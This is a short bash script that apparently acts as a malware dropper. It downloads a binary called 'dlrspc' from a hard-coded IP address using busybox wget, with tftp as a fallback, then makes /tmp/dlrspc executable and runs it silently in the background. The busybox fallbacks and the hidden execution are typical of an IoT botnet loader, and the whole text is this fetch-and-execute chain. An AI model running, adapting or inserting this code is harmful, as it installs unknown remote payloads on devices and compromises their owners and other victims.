#!/bin/bash
echo "spc binary executed successfully"
/bin/busybox wget -O - http://63.250.59.28:80/dlrspc || /bin/busybox tftp -g -r dlrspc 63.250.59.28 || echo "Download failed"
chmod +x /tmp/dlrspc 2>/dev/null
/tmp/dlrspc 2>/dev/null &
